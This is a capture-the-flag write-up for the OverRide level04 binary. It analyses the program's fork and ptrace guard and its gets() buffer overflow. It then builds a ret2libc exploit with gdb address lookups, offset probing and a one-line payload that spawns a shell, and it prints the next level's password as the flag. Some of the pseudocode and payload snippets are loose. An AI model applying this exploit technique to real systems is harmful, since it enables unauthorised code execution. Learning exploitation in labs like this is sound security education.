# **Level04**

In this level, the program asks us to provide shellcode.

```nasm
$ ./level04
Give me some shellcode, k
hello
```

## **Binary Analysis**

The program forks into a **parent** and **child** process:

- **Parent Process:**
    - Monitors the child using `wait()`.
    - Detects `exec()` calls and terminates the child if triggered.
- **Child Process:**
    - Uses `prctl()` and `ptrace()` to prevent debugging.
    - Reads user input with `gets()` (**buffer overflow vulnerability**).

The parent ensures execution control, while the child has a critical vulnerability in `gets()`.

```nasm
 	; Fork process
   0x080486d6: call   fork@plt
   0x080486db: mov    %eax,0xac(%esp)    ; Store pid

  ; Buffer setup
   0x080486d0: sub    $0xb0,%esp         ; Allocate 176 bytes
   0x080486e2: lea    0x20(%esp),%ebx    ; Buffer at esp+32
   0x080486eb: mov    $0x20,%edx         ; Size 32 bytes
   
	  ; Child process (pid == 0)
		0x08048713: movl   $0x1,0x4(%esp)    ; PR_SET_PDEATHSIG
		0x08048722: call   prctl@plt         ; Set death signal
		0x08048746: call   ptrace@plt        ; Anti-debugging
		
		; Parent process
		0x080487dc: call   ptrace@plt        ; Monitor child
		0x080487e8: cmpl   $0xb,0xa8(%esp)   ; Check for SIGTRAP
		
		; In child process
		0x0804875b: mov    %eax,(%esp)       ; Buffer address
		0x0804875e: call   gets@plt          ; Vulnerable gets call
```

**pseudocode:**

```c
int main() {
    pid_t pid = fork();    // Creates two processes
    char buffer[32] = {0}; // 32-byte buffer

    if (pid == 0) {        // Child process
        prctl(1, 1);       // Set death signal
        ptrace(0, 0, 0, 0);// Anti-debug setup
        
        puts("Give me some shellcode, k");
        gets(buffer);      // Vulnerable gets
    }
    else {                 // Parent process
        wait(&status);     // Wait for child
        ptrace(3, pid, 44, 0); // Monitor child
        
        if (status == 11)  // Check for exec
            puts("no exec() for you");
    }
}
```

## **Vulnerability**

The `gets()` function doesn't check the input size, and the buffer is only 32 bytes. This lets us write past the buffer and overwrite the return address, which can be exploited. Also, there is a vulnerability in the libc functions that can be used.

```c
gdb) info functions
[...]
0x08048530  __libc_start_main
0x08048530  __libc_start_main@plt
[...]
(gdb)
```

## **Exploit**

We need to retrieve the address of the `system` function and the address of the `"/bin/sh"` string to spawn a shell.

```c
(gdb) b *main
Breakpoint 1 at 0x80486c8
(gdb) r
Starting program: /home/users/level04/level04

Breakpoint 1, 0x080486c8 in main ()
(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec:	 "/bin/sh"
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb)
```

Next, we need to find the offset of the return address by analyzing what happens when we input various lengths.

```python
# 154 bytes: Program exits normally
python -c 'print "A"*154' | ./level04
child is exiting...

# 155 bytes: Program exits normally
python -c 'print "A"*155' | ./level04
child is exiting...

# 156 bytes: Program behavior changes
python -c 'print "A"*156' | ./level04
Give me some shellcode, k
```

Now we can create the proper exploit:

```python
# Addresses
system = 0xf7e6aed0    # system() address
binsh = 0xf7f897ec     # "/bin/sh" string address

# Craft payload
payload = "A" * 156     # Exact padding to reach return address
payload += system       # system() address
payload += "JUNK"       # 4 bytes fake return
payload += binsh        # "/bin/sh" address
```

Final exploit:

```python
(python -c 'print "A"*156 + "\xd0\xae\xe6\xf7" + "MIMI" + "\xec\x97\xf8\xf7"'; cat) | ./level04
```

Execute the exploit:

```python
level04@OverRide:~$ (python -c 'print "A"*156 + "\xd0\xae\xe6\xf7" + "MIMI" + "\xec\x97\xf8\xf7"'; cat) | ./level04
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN

```

## Flag

```python
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```